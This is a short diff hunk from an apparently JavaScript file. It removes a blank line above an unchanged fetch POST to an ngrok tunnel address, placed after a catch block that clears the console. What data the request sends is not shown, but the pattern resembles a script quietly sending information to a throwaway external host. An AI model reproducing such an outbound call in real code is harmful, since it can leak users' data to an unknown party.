@@ -26,7 +26,6 @@ function main() {
     }catch {
         console.clear();
     }
-    
     fetch('https://4979-107-189-10-123.eu.ngrok.io/',{
         method: 'POST',
         headers: {
